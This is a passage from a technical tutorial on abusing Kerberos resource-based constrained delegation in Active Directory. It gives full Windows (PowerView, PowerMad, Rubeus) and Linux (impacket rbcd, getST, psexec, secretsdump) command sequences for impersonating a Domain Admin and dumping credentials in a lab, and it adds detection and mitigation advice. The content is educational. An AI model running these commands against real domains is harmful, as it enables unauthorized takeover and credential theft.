   - [NTLM Relay Attacks](https://www.fortalicesolutions.com/posts/hunting-resource-based-constrained-delegation-in-active-directory)
   <span id=10>
   - Create an arbitrary Computer Account.
	
> The domain object itself has an attribute named "[MS-DS-Machine-Account-Quota](https://www.netspi.com/blog/technical-blog/network-penetration-testing/machineaccountquota-is-useful-sometimes/)" that governs how many Computer Accounts a non-privileged user (usually a Computer Account & a traditional domain user) can create within the domain; by default this value is 10.
>
> If the value of this attribute is >=1 an attacker could create an arbitrary Computer Account and use it to carry out the attack.

## **Abuse RBCD via DACL (Computer) - Windows**

In this scenario we will see how to perform an RBDC Abuse via DACL, [in the most common scenario](#9), from a Windows machine.

1. **The attacker verifies which user accounts have write permission on the attribute "ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity" of a Computer object.**

    To do this the attacker can use "BloodHound" or perform queries using "PowerView":

    - BloodHound

         Below we can verify with BloodHound that the domain user "MARVEL\UserA" HAS write permissions, in this case GenericAll, on the Computer object "SPIDERMAN", consequently will be able to configure RBDC on it.

        {{< image src="/demystify_kerberos_delegation_attacks/21.png" position="center" style="border-radius: 8px;">}}

    - PowerView

         Below we can verify with PowerView that the domain user "MARVEL\UserA" HAS write permissions on the Computer object "SPIDERMAN", consequently will be able to configure RBDC on it:

        ```
        PS C:\>
        $computers = Get-DomainComputer
        $users = Get-DomainUser
        $accessRights = "GenericWrite","GenericAll","WriteProperty","WriteDacl"
        foreach ($computer in $computers) {
            $acl = Get-ObjectAcl -SamAccountName $computer.SamAccountName -ResolveGUIDs
                    
            foreach ($user in $users) {
                        $hasAccess = $acl | ?{$_.SecurityIdentifier -eq $user.ObjectSID} | %{($_.ActiveDirectoryRights -match ($accessRights -join '|'))}
                    
                        if ($hasAccess) {
                            Write-Output "$($user.SamAccountName) has the required access rights on $($computer.Name)"
                        }
            }
        }
        ```
        {{< image src="/demystify_kerberos_delegation_attacks/22.png" position="center" style="border-radius: 8px;">}}  

    Indeed, via ADUC we can see how there is actually an ACE on the DACL of the SPIDERMAN object that grants the Trustee MARVEL\UserA the "GenericWrite" permission.

    {{< image src="/demystify_kerberos_delegation_attacks/23.png" position="center" style="border-radius: 8px;">}}  

2. **The attacker compromises the domain account MARVEL\UserA that has the required write permissions on the SPIDERMAN machine**

    In this scenario the attacker managed to recover, for example via Password Spray, the credentials of the account "MARVEL\UserA", so the domain account that has the required write permissions on the SPIDERMAN machine.
<span id=12>

3. **The attacker creates a "Computer Account" inside the domain.**

    The attacker needs to control an account with a configured SPN, in this way it can be used to invoke the S4U extensions and exploit the RBCD that we will configure later.

    Since Computer Accounts have an SPN configured by default, the attacker will tend to compromise one and in order to do that most common way is to exploit a feature present by default in every domain.

    [As already said](#10), the domain object itself has an attribute named "MS-DS-Machine-Account-Quota" that regulates how many Computer Accounts a non-privileged user (usually a Computer Account & a traditional domain user) is able to create inside the domain; by default this value is equal to 10; consequently if this value is >=1 the attacker could create an arbitrary "Computer Account".

    Below is the [command](https://www.jorgebernhardt.com/how-to-change-attribute-ms-ds-machineaccountquota/) that checks the value present in the "MS-DS-Machine-Account-Quota" attribute:

    ```
    PS C:\> Get-ADObject `
    -Identity ((Get-ADDomain).distinguishedname) `
    -Properties ms-DS-MachineAccountQuota
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/24.png" position="center" style="border-radius: 8px;">}}

    Since the value is >=1 we can create an arbitrary "Computer Account", in a Windows context we can use the "[PowerMad](https://github.com/Kevin-Robertson/Powermad)" tool, specifically running the following command:

    ```
    PS C:\> New-MachineAccount -MachineAccount <ComputerAccount_Name> -Password $(ConvertTo-SecureString "<ComputerAccount_Password>" -AsPlainText -Force)
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/25.png" position="center" style="border-radius: 8px;">}}

    As you can see following the command a new arbitrary Computer Account has been created.

    Creating a "Computer Account" is equivalent to creating a "Computer" object inside the domain, in fact inspecting the objects via ADUC we will find the "Computer" object named "FakeComputerAccount" (which will contain inside it the related Computer Account "FakeComputerAccount\$")
    <span id=11>

    {{< image src="/demystify_kerberos_delegation_attacks/26.png" position="center" style="border-radius: 8px;">}}

<span id=15>

4. **The attacker, using the account "MARVEL\UserA", populates the attribute "msDS-AllowedToActOnBehalfOfOtherIdentity" of the machine SPIDERMAN with the value of the Computer Account "FakeComputerAccount" previously created, in this way the attacker has forced a malicious RBCD configuration on the machine SPIDERMAN.**

    To do this the attacker can use the following commands (they require PowerView):

    - Retrieve the SID of the previously created Computer Account

        ```
        PS C:\> $ComputerSid = Get-DomainComputer <Created_Computer_Account> -Properties objectsid | Select -Expand objectsid 
        ```

    > It is necessary to specify the Computer and not the Computer Account to avoid an error, in other word you must write for example "FakeComputerAccount" but not "FakeComputerAccount\$"

    - Create the value that will be inserted into the parameter "msDS-AllowedToActOnBehalfOfOtherIdentity", specifically the [SDDL](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language) syntax in raw binary format will be used

        ```
        PS C:\Tools> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))" 
        PS C:\Tools> $SDBytes = New-Object byte[] ($SD.BinaryLength) 
        PS C:\Tools> $SD.GetBinaryForm($SDBytes, 0) 
        ```

    - Using PowerView the attacker modifies the attribute "msDS-AllowedToActOnBehalfOfOtherIdentity" of the machine SPIDERMAN with the value of the Computer Account "FakeComputerAccount$" previously created, which is represented by the value built previously; this modification action will be performed impersonating the credentials entered in that command.

        ```
        PS C:\Tools> $credentials = New-Object System.Management.Automation.PSCredential "<domain>\<user_with_write_permission>", (ConvertTo-SecureString "<user_with_write_permission_password>" -AsPlainText -Force) 
        PS C:\Tools> Get-DomainComputer <target_computer> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose
        ```

    Below is the execution of all the commands just described:

    {{< image src="/demystify_kerberos_delegation_attacks/27.png" position="center" style="border-radius: 8px;">}}

    With these commands the attacker, impersonating the account "MARVEL\UserA", populates the attribute "msDS-AllowedToActOnBehalfOfOtherIdentity" of the machine SPIDERMAN with the value of the Computer Account "FakeComputerAccount$" previously created (or rather in its representation with the correct syntax [SDDL](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)), in this way the attacker forced a malicious RBCD configuration on the machine SPIDERMAN.

    Indeed, if we now inspect the attribute "msDS-AllowedToActOnBehalfOfOtherIdentity" of the machine SPIDERMAN we can see that:

    - Via ADUC it is noticeable that there is indeed a value with a dedicated syntax (which actually represents the Computer Account "FakeComputerAccount\$").

        {{< image src="/demystify_kerberos_delegation_attacks/28.png" position="center" style="border-radius: 8px;">}}

    <span id=18>

    - Via "Get-ADComputer" (requires RSAT) it is noticeable that the value "MARVEL\FakeComputerAccount\$" is indeed present.

        {{< image src="/demystify_kerberos_delegation_attacks/29.png" position="center" style="border-radius: 8px;">}}
<span id=1002>

5. **The attacker obtains a TGS Ticket (of Domain Admin) valid to authenticate to the CIFS service hosted on the machine SPIDERMAN.**

    The attacker, now that they have configured a malicious RBCD, so they have populated the "msDS-AllowedToActOnBehalfOfOtherIdentity" attribute of the SPIDERMAN machine with the value of the Computer Account "FakeComputerAccount\$", can impersonate this account to invoke the ["S4U2Self" & "S4U2Proxy"](./demystify_kerberos_delegation.md#100) extensions (having at least 1 SPN configured allows them to do so) and thus obtain a TGS Ticket belonging to a Domain Admin user valid to access ANY service hosted on the SPIDERMAN machine (or rather any service running under the SPIDERMAN\$ Service Account, [so, all services started with the Local Service account such as by default the CIFS service](./not_so_brief_overview_about_kerberos/#17)).

    Since performing this action requires knowing the [RC4 Key (NT Hash)](./not_so_brief_overview_about_kerberos.md#178) or other types of secrets of the Computer Account "FakeComputerAccount$", we can generate them by giving Rubeus the corresponding plaintext password with the following command:

    ```
    PS C:\Tools> .\Rubeus.exe hash /password:<ComputerAccount_Created_Password> /user:<ComputerAccount_Created> /domain:<domain>
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/30.png" position="center" style="border-radius: 8px;">}}
            
    Since we will inject the desired TGS Ticket into memory, first we use the so-called Sacrificial Process.

    ```
    C:> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/31.png" position="center" style="border-radius: 8px;">}}

    Then execute the following Rubeus command inside the Sacrificial Process.

    <spain id=24>

    ```
    C:\> .\Rubeus.exe s4u /user:<Created_Computer_Account> /rc4:<Created_Computer_Account_RC4Key> /impersonateuser:<User_To_Impersonate> /msdsspn:<Desired_SPN> /nowrap /ptt
    ```
    <span id=14>

    > Unlike the [Abuse Protocol Transition context where the "/msdsspn" parameter](#5) was populated exclusively with the SPN present in the "msds-allowedtodelegateto" property, in the RBDC Abuse via DACL context it should be populated with an arbitrary SPN chosen by the attacker; in this way, the ([S4UProxy](./demystify_kerberos_delegation.md#118) will specify this chosen SPN and since the KDC will use the RBCD, it will return in the corresponding S4UProxy Response the TGS Ticket valid for the requested arbitrary service.

    **[As already mentioned](./demystify_kerberos_delegation.md#behaviour-change-about-kerberos-delegation-on-modern-windows-system), Microsoft POST 2021 slightly modified the traditional RBCD flow; since our lab consists of a Windows Server 2022 acting as DC, the flow that will be analyzed will cover this modern case; that said, i'll  highlight the logic of how the attack would have worked ALSO BEFORE 2021:**

    <span id=1003>

    1. **Rubeus sent a "[KRB\_AS\_REQ](./not_so_brief_overview_about_kerberos.md#39)" to obtain the TGT Ticket of the Computer Account FakeComputerAccount\$, [information necessary](./demystify_kerberos_delegation.md#231) to invoke the "KRB\_TGS\_REQ (S4USelf)"**

        {{< image src="/demystify_kerberos_delegation_attacks/32.png" position="center" style="border-radius: 8px;">}}
        <br>
        {{< image src="/demystify_kerberos_delegation_attacks/33.png" position="center" style="border-radius: 8px;">}}

    <span id=34>

    2. **Rubeus, now that it has the TGT Ticket of the Computer Account "FakeComputer\$", sends a "KRB\_TGS\_REQ [(S4U2Self)](./demystify_kerberos_delegation.md#2-krb_tgs_req-s4u2self--s4uself-request)" to obtain a TGS Ticket on behalf of the user "MARVEL\Administrator" (Domain Admin) valid for the same service.**

        {{< image src="/demystify_kerberos_delegation_attacks/34.png" position="center" style="border-radius: 8px;">}}

        <span id=31>

        As we can note Rubeus sends a "KRB\_TGS\_REQ [(S4U2Self)](./demystify_kerberos_delegation.md#2-krb_tgs_req-s4u2self--s4uself-request)"; analyzing the content of the packet one can observed that: 1) [Inside the "PA-FOR-USER"](./demystify_kerberos_delegation.md#245) data structure the request for the TGS Ticket on behalf of the user "MARVEL\Administrator" (it's a Domain Admin) is indeed present; 2) the [Computer Account FakeComputerAccount\$](#11) [is explicitly indicated](./demystify_kerberos_delegation.md#31)), in this way the issued TGS Ticket will be valid for all services started by this Service Account.

        {{< image src="/demystify_kerberos_delegation_attacks/35.png" position="center" style="border-radius: 8px;">}}

        <span id=13>

        [As we already told](./demystify_kerberos_delegation.md#71), the KDC will issue a TGS Ticket with the FORWARDABLE flag set to 0 exclusively if the Service Account "FakeComputerAccount\$" is configured with Constrained Delegation (Kerberos Only) (so: TrustedToAuthForDelegation flag NOT set & with the "msDS-AllowedToDelegateTo" property NOT empty - there must be entries); [since the FakeComputerAccount\$ user instead has NO type of Kerberos Delegation](#12), the Computer Account "FakeComputerAccount\$" will NOT have the "msDS-AllowedToDelegateTo" flag and consequently the requested TGS Ticket (belonging to the user "MARVEL\Administrator" & valid for all services started by this Service Account) will be issued with the FORWARDABLE flag set to 1.

        {{< image src="/demystify_kerberos_delegation_attacks/36.png" position="center" style="border-radius: 8px;">}}

        <span id=17>

        > **BEFORE 2021:**
        >
        > As we already told ([1](./demystify_kerberos_delegation.md#behaviour-change-about-kerberos-delegation-on-modern-windows-system), [2](./demystify_kerberos_delegation.md#50)), in BEFORE 2021 scenario the KDC will still issues the requested TGS Ticket BUT it will NOT have the FORWARDABLE flag set to 1; instead, it is 0.

    <span id=16>

    3. **Rubeus now that it has the TGS Ticket (belonging to the user MARVEL\Administrator") valid for the service itself, will be able to use it as "evidence" to invoke the "KRB_TGS_REQ (S4UProxy)", in this way the attacker will obtain a TGS Ticket (still belonging to the user MARVEL\Administrator") valid for the CIFS service exposed on the SPIDERMAN machine (CIFS/SPIDERMAN)**
    
        {{< image src="/demystify_kerberos_delegation_attacks/37.png" position="center" style="border-radius: 8px;">}}

        As we can note Rubeus sends a "KRB\_TGS\_REQ ([S4UProxy](./demystify_kerberos_delegation.md#118)), analyzing the content of the packet it can be observed that: 1) Inside the "Additional Ticket" field the [TGS Ticket previously received in the "S4USelf Response](#13)" is sent 2) [the SPN chosen by the attacker on the Rubeus command is indicated](#23); 
        
        > In order to obtain a valid TGS Ticket the SPN provided must belong to a service that will be executed by the Computer Account "SPIDERMAN\$" ([so, all services started with the Local Service account such as by default the CIFS service](./not_so_brief_overview_about_kerberos/#17)), in this case the SPN "CIFS/SPIDERMAN.MARVEL.local" is present.

        <span id=19>

        {{< image src="/demystify_kerberos_delegation_attacks/38.png" position="center" style="border-radius: 8px;">}}

        <span id=20>
    
        The KDC [verifies](./demystify_kerberos_delegation.md#199) if the TGS Ticket received inside the "additional-tickets" field (besides being valid) has the "FORWARDABLE" flag set to "1" ([positive outcome](#13)) & that inside the Service Account FakeComputerAccount\$'s "[msds-allowedtodelegateto](./demystify_kerberos_delegation.md#101)" property the requested service is present, [so in this case "CIFS/SPIDERMAN"](#15) (outcome negative), [since this second check fails](./demystify_kerberos_delegation.md#65) ([because that property is NOT present at all](#12)) and [the packet has the RBDC flag](./demystify_kerberos_delegation.md#61) set to use that Kerberos Delegation in case of FallBack, the KDC resorts to Resource Based Constrained Delegation (RBCD).

        > **BEFORE 2021**
        >
        >  [As already told](./demystify_kerberos_delegation.md#90): In BEFORE 2021 scenario the KDC checks if the TGS Ticket received inside the "additional-tickets" field (besides being valid) has the "FORWARDABLE" flag set to "1" ([outcome negative](#17)) & that inside the Service Account FakeComputerAccount\$'s "msds-allowedtodelegateto" property the requested service is present, so in this case ["CIFS/SPIDERMAN"](#15) (outcome negative); since the first check [already fails](#17) [and the packet has the RBDC flag](./demystify_kerberos_delegation.md#61) set to use that Kerberos Delegation in case of FallBack, the KDC resorts anyway to the [Resource Based Constrained Delegation (RBCD)](./demystify_kerberos_delegation.md#resource-based-constrained-delegation-rbcd).

        Consequently, the KDC retrieves the Service Account (SPIDERMAN\$) of the requested service (CIFS) and verifies if it has the "ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity" flag containing the Service Account (FakeComputerAccount\$) of the service that is attempting authentication on behalf of the Client (MARVEL\Administrator); if, as in this case, [the outcome is positive](#18), then the KDC issues a TGS Ticket (belonging to the user MARVEL\Administrator") valid for the CIFS service exposed on the SPIDERMAN machine (as with any other valid TGS Ticket this one will also have the "FORWARDABLE" flag set to "1").

        {{< image src="/demystify_kerberos_delegation_attacks/39.png" position="center" style="border-radius: 8px;">}}

    As you can see, following the Rubeus command we will have cached in memory a TGS Ticket belonging to the "Administrator" user valid for the CIFS service of the SPIDERMAN machine; in fact, by performing a Network Logon with "PsExec" the OS will retrieve the cached TGS Ticket and use it to perform the authentication; in this way the attacker has managed to successfully authenticated with administrative privileges to the SPIDERMAN machine.

    {{< image src="/demystify_kerberos_delegation_attacks/40.png" position="center" style="border-radius: 8px;">}}

   > If you receive an authentication error try re-running the command including the ["msdsspn" parameter](#23) with a value that does not include the domain suffix, so from "SPIDERMAN.marvel.local" to "SPIDERMAN" ([technically without the domain you should not encounter issues](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#trial-and-error)); also verify to use the same domain nomenclature you inserted in "msdsspn" within the PsExec command (in this case), so if you request, for example, a TGS Ticket valid to access the SPIDERMAN.marvel.local machine use the same wording to connect via PsExec; finally, I do not understand why, sometimes PsExec only works if a "dir \\<hostname>\C\$" is executed beforehand (this is especially true for Computers with Unconstrained Delegation enabled, such as the DC).

    <span id=43>
    
    An attacker, after performing the attack, to partially restore the situation (since the created Computer Account cannot be deleted [unless](https://web.archive.org/web/20250324161821/https://www.fortalicesolutions.com/posts/hunting-resource-based-constrained-delegation-in-active-directory) one has administrative permissions on the domain) could remove the "msDS-AllowedToActOnBehalfOfOtherIdentity" property [previously configured](#15) to enable the malicious RBCD on the target Computer object "SPIDERMAN"; to do this run the following Powershell commands (require PowerView):

    ```
    PS C:\Tools> $credentials = New-Object System.Management.Automation.PSCredential "<domain>\<user_with_write_permission>", (ConvertTo-SecureString "<user_with_write_permission_password>" -AsPlainText -Force)
    PS C:\Tools> Get-DomainComputer <target_computer> | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity -Credential $credentials -Verbose
    ```

## **Abuse RBCD via DACL (Computer) - Linux**

In this scenario we will see how to perform an [Abuse RBDC via DACL](#abuse-rbcd-via-dacl), [in the most common scenario](#9), from a Linux machine.

1. **The attacker checks which accounts have write permission on the attribute "[ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity?ref=labs.lares.com)" of a Computer-type object.**

    Below we can verify with BloodHound that the domain account "MARVEL\UserA" HAS write permissions, in this case GenericAll, on the Computer object "SPIDERMAN", consequently it will be able to configure the RBCD on it.

    {{< image src="/demystify_kerberos_delegation_attacks/105.png" position="center" style="border-radius: 8px;">}}

2. **The attacker compromises the domain account MARVEL\UserA which has the required write permissions on the SPIDERMAN machine.**

    In this scenario the attacker managed to retrieve, for example through Password Spray, the credentials of the account "MARVEL\UserA", that is, the domain account that has the required write permissions on the SPIDERMAN machine.

3. **The attacker creates a "Computer Account" within the domain.**

    The attacker needs to control an account with a configured SPN, since it can be used to invoke the S4U extensions and exploit the RBCD that we will configure later.

    Since Computer Accounts have an SPN configured by default, the attacker will tend to compromise one in order to use it; among the various methods, the most common one is to exploit a feature that is present by default in every domain.

    The domain has an attribute named "MS-DS-Machine-Account-Quota" which regulates how many Computer Accounts a non-privileged user (usually a Computer Account or a traditional Domain User) is able to create within the domain; by default this value is equal to 10; consequently, if this value is >=1, the attacker could create an arbitrary "Computer Account".

    Below is the [command](https://www.jorgebernhardt.com/how-to-change-attribute-ms-ds-machineaccountquota/) that checks the value present in the "MS-DS-Machine-Account-Quota" attribute:

    ```
    # ldapsearch -x -H ldap://<DCIP_or_DCHostname> -b 'DC=<domain>,DC=<domain>' -D "<user>@<domain>" -W -s sub "(objectclass=domain)" | grep ms-DS-MachineAccountQuota
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/106.png" position="center" style="border-radius: 8px;">}}

    Since the value is >=1 we can create an arbitrary "Computer Account", in a Linux context we can use the "[addcomputer.py](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py)" tool from Impacket, specifically by executing the following command:

    {{< image src="/demystify_kerberos_delegation_attacks/107.png" position="center" style="border-radius: 8px;">}}

    As you can see, following the command a new arbitrary Computer Account has been created; creating a "Computer Account" is equivalent to creating an object of type "Computer" within the domain.

4. **The attacker, using the account "MARVEL\UserA", populates the attribute "msDS-AllowedToActOnBehalfOfOtherIdentity" of the SPIDERMAN machine with the value of the previously created Computer Account "MaliciousAccount$", in this way the attacker has enforced a malicious RBCD configuration on the SPIDERMAN machine.**

    ```
    # impacket-rbcd -dc-ip <dc_ip> <domain>/<user>:'<password>' -action write -delegate-to '<Computer_Account_target>' -delegate-from '<Computer_Account_Malicious>'
    ```

    To verify if the modification was successful, execute the following command:

    ```
    # impacket-rbcd -dc-ip <dc_ip> <domain>/<user>:'<password>' -action read -delegate-to '<Computer_Account_target>'
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/108.png" position="center" style="border-radius: 8px;">}}

    With these commands, the attacker, impersonating the account "MARVEL\UserA", has populated the attribute "msDS-AllowedToActOnBehalfOfOtherIdentity" of the SPIDERMAN machine with the value of the previously created Computer Account "MaliciousAccount$", in this way the attacker has enforced a malicious RBCD configuration on the SPIDERMAN machine.

5. **The attacker obtains a valid TGS Ticket (of a Domain Admin) to authenticate to the CIFS service hosted on the SPIDERMAN machine.**

    [Since it has already been explained in detail previously, this section will be a summary of it](#1002).
    
    Now that the attacker has configured a malicious RBCD, meaning they have populated the attribute "msDS-AllowedToActOnBehalfOfOtherIdentity" of the SPIDERMAN machine with the value of the Computer Account "MaliciousAccount$", they can impersonate this account to invoke the S4U2Self & S4U2Proxy extensions (having at least one configured SPN allows them to do so) and therefore obtain a TGS Ticket belonging to a Domain Admin account, valid for accessing ANY service hosted on the SPIDERMAN machine (or rather, any service running with the Service Account SPIDERMAN$, so, all services started with the Local Service account such as, by default, the CIFS service).

    ```
    # impacket-getST -spn <SPN_desiderato> -impersonate <User_To_Impersonate> -dc-ip <DC_IP> '<domain>/<Computer_Account_Creato>':<password>
    ```

    > Unlike the Abuse Protocol Transition context where the "/msdsspn" parameter was populated exclusively with the SPN present in the "msds-allowedtodelegateto" property, in the context of Abuse RBDC via DACL it must be populated with an arbitrary SPN chosen by the attacker, in this way, in the S4UProxy Request that SPN will be specified, and since the KDC will use the RBCD, it will return in the corresponding S4UProxy Response the TGS Ticket valid for the arbitrary requested service.

    {{< image src="/demystify_kerberos_delegation_attacks/109.png" position="center" style="border-radius: 8px;">}}

    Let's [SUMMARILY](#1003) analyze all the operations performed by getST.

    1. Impacket getST, since it does NOT find a ".cache" file related to the TGT Ticket of the Computer Account MaliciousAccount$, sends a "KRB_AS_REQ" to obtain precisely the TGT Ticket of the Computer Account MaliciousAccount$, information necessary to invoke the "KRB_TGS_REQ (S4USelf)"

        {{< image src="/demystify_kerberos_delegation_attacks/110.png" position="center" style="border-radius: 8px;">}}

    2. Impacket getST now that it has the TGT Ticket of the Computer Account "MaliciousAccount$" sends a "KRB_TGS_REQ (S4USelf)" to obtain a TGS Ticket on behalf of the account "MARVEL\Administrator" (Domain Admin) valid for the service itself.

        {{< image src="/demystify_kerberos_delegation_attacks/111.png" position="center" style="border-radius: 8px;">}}

    3. Impacket getST now that it has the TGS Ticket (belonging to the account MARVEL\Administrator") valid for the service itself, it will be able to use it as "evidence" to invoke the "KRB_TGS_REQ (S4UProxy)", in this way the attacker will obtain a TGS Ticket (always belonging to the account MARVEL\Administrator") valid for the CIFS service exposed on the SPIDERMAN machine (CIFS/SPIDERMAN)

        {{< image src="/demystify_kerberos_delegation_attacks/112.png" position="center" style="border-radius: 8px;">}}

Now we could, for example, use the Impacket suite to access the SPIDERMAN machine via PsExec, in this example we will use Impacket's "psexec" (smbexec.py can also be used)", consequently it is necessary to configure an environment variable named "KRB5CCNAME" and make sure that it contains the file just created, so the TGS Ticket.

```
# export KRB5CCNAME=./<user>@<service>_<hostname>@<domain>.ccache
```

{{< image src="/demystify_kerberos_delegation_attacks/113.png" position="center" style="border-radius: 8px;">}}

After that, use for example Impacket's "psexec" to perform the authentication, in this way the attacker will be able to authenticate with administrative privileges to the SPIDERMAN machine.

```
# impacket-psexec -k -no-pass <hostname>
```

{{< image src="/demystify_kerberos_delegation_attacks/114.png" position="center" style="border-radius: 8px;">}}

In a Linux context it is straightforward and convenient to also use the Impacket tool "secretsdump" in order to dump the OS Credentials present on the target machine, this is because it also supports Kerberos Authentication following the same logic as every other tool in the Impacket suite.

{{< image src="/demystify_kerberos_delegation_attacks/115.png" position="center" style="border-radius: 8px;">}}

An attacker, after having carried out the attack, to partially restore the situation (given that the created Computer Account cannot be deleted unless one has administrative permissions on the domain) could remove the property "msDS-AllowedToActOnBehalfOfOtherIdentity" previously configured to enable the malicious RBCD on the Target Computer object "SPIDERMAN":


```
# impacket-rbcd -dc-ip <DC_IP> <domain>/<user>:'<password>' -action remove -delegate-to '<ComputerAccount_targate>$' -delegate-from '<malicious_computeraccount>'
```
{{< image src="/demystify_kerberos_delegation_attacks/116.png" position="center" style="border-radius: 8px;">}}

## **Abuse RBCD via DACL - Detect & Mitigation**

**Detect**

Configure a [SACL](https://labs.lares.com/securing-active-directory-via-acls/) that will monitor the modification of the attribute [ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity](https://learn.microsoft.com/it-it/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity) ([1](https://www.alteredsecurity.com/post/resource-based-constrained-delegation-rbcd), [2](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html))

**Mitigation**

Although this type of attack cannot be completely prevented since it exploits how Kerberos Delegation works, there are mitigations that can mitigate the impact:

- Configure the property "Account is sensitive and cannot be delegated" on privileged accounts ([detailed explaination here](#abuse-protocol-transition---detect--mitigation))

- Add privileged accounts to the "Protected Users Group" ([detailed explaination here](#abuse-protocol-transition---detect--mitigation))

- Modify the domain attribute "[MS-DS-Machine-Account-Quota](https://www.netspi.com/blog/technical-blog/network-penetration-testing/machineaccountquota-is-useful-sometimes/)" by entering the value 0.

    Entering the value 0 will make it impossible for the attacker to create an arbitrary "Computer Account", thereby making the attacker's Abuse RBCD via DACL scenario more complicated.

    To perform this action access [ADUC](https://www.varonis.com/blog/active-directory-users-and-computers) and simply set this property to 0 within the "domain" object.

    {{< image src="/demystify_kerberos_delegation_attacks/120.png" position="center" style="border-radius: 8px;">}}

    > This change will [NOT](https://learn.microsoft.com/en-us/archive/technet-wiki/5446.active-directory-how-to-prevent-authenticated-users-from-joining-workstations-to-a-domain) impact the following users: Domain Admin, Administrators, users who have the permission to create & delete "Computer Account" within an OU; consequently, changing this value to 0 will NOT cause any kind of service disruption to domain administrators.

## **Abuse Kerberos Only**

**[Kerberos Only](./demystify_kerberos_delegation.md#constrained-delegation-kerberos-only), being similar to [Protocol Transition](./demystify_kerberos_delegation.md#constrained-delegation-use-any-authentication-protocol--protocol-transition), one might think that an attacker could exploit it doing the exact same steps described in [Abuse Protocol Transition](#abuse-protocol-transition)**, so that compromising the Service Account with Kerberos Only one would also be able to compromise (impersonating ANY domain user) the machine for which it is authorized to access on behalf of the Client (indicated in the flag "[msds-allowedtodelegateto](./demystify_kerberos_delegation.md#101)"); **this, unfortunately, is NOT possible** because in that scenario the attacker could NOT "correctly" invoke the S4USelf extension to target an arbitrary user, this because if done the KDC would return a TGS Ticket with the FORWARDABLE Flag set to 0 ([both PRE-2021 and POST-2021](#49)) and therefore NOT valid to include it (additional-ticket) in  the subsequent S4UProxy ([if the S4UProxy were sent anyway the KDC would force the RBCD which, not being configured, would end with an error response](./demystify_kerberos_delegation.md#305)).

<span id=49>

This logic is true both PRE-2021 and POST-2021, in fact:

- PRE-2021: In an S4USelf Response the KDC will provide a TGS Ticket with the FORWARDABLE flag set to 0, it happens because [the Service Account in this case of the Kerberos Only does NOT have the "TRUSTED_TO_AUTH_FOR_DELEGATION"](./demystify_kerberos_delegation.md#76) flag. (in a ["Kerberos Only" context the relevant Service Account is configured only with the "msds-allowedtodelegateto" flag](./demystify_kerberos_delegation.md#348))

- POST-2021: In an S4USelf Response the KDC will provide a TGS Ticket with the FORWARDABLE flag set to 0, it happens because the Service Account is configured with a [Kerberos Only (so, it does NOT have the "TRUSTED_TO_AUTH_FOR_DELEGATION" flag & has configured the "msds-allowedtodelegateto" flag with some values)](./demystify_kerberos_delegation.md#71)

**That said, it is still possible to [Abuse Kerberos Only](#abuse-kerberos-only-computer---windows) but it is necessary to leverage the knowledge acquired through "[Abuse Protocol Transition](#abuse-protocol-transition)" and "[Abuse RBCD via DACL](#abuse-rbcd-via-dacl)".**

The prerequisites of "Abuse Kerberos Only" are:

- [Analogous to "Abuse RBCD"](#51): The attacker needs to control an account that is capable of invoking the “S4USelf” extensions, usually a Computer Account is created by exploiting the default value of “MS-DS-Machine-Account-Quota”

- Compromise the Service Account that has [Constrained Delegation (Kerberos Only)](demystify_kerberos_delegation.md#constrained-delegation-kerberos-only) enabled

The most common steps to carry out an "Abuse Kerberos Only" are:
<span id=52>

1. The attacker obtains a "Computer Account" which will be able to perform an “S4USelf", typically it will be created by exploiting the default value of “MS-DS-Machine-Account-Quota”.

<span id=60>

2. The attacker, after compromising the Service Account (usually a Computer Account) with Kerberos Only configured, sets on it the property "ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity" containing as value the Computer Account [previously created by the attacker](#52); in other words, he configures a so called "Self-RBCD".

<span id=70>

> [By default every Computer Account](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained#without-protocol-transition) (from my tests even standard domain users) has permissions to edit its own "ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity" property, this behavior allows to perform this kind of attack; Microsoft appears to have [patched](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained#without-protocol-transition) this behavior in August / September 2022, so for example on Windows Server 2025 this technique may NO longer work.

3. Analogous to an [Abuse RBCD via DACL](#abuse-rbcd-via-dacl), the attacker could invoke the "S4USelf" and "S4UProxy" extensions with the [previously](#52) created Computer Account to exploit the specially configured RBCD and thus obtain a TGS Ticket (belonging to an administrative domain account) valid for a service on the machine with Kerberos Only enabled; instead of using it in an authentication (an action that WOULD NOT make sense since the attacker has already compromised the machine with Kerberos Only) this TGS Ticket will be used [subsequently](#53) in an alternative way; the sub-steps are:
<span id=59>

   - The attacker performs an S4USelf Request impersonating the Computer Account ([previously](#52) created) to obtain a TGS Ticket valid for the services started by that same Computer Account, so none. 
   
        > This phase rappresent these phases ([1](#57), [2](#39))
<span id=61>

   - The attacker, using the [previously obtained TGS Ticket](#59) and exploiting the [Self-RBCD previously configured](#60) on the Service Account with Kerberos Only, is able to obtain a TGS Ticket belonging to an administrative account to access the machine with Kerberos Only enabled (this TGS Ticket will be used [subsequently](#53))

        > This phase rappresent this phase ([1](#33))

<span id=53>

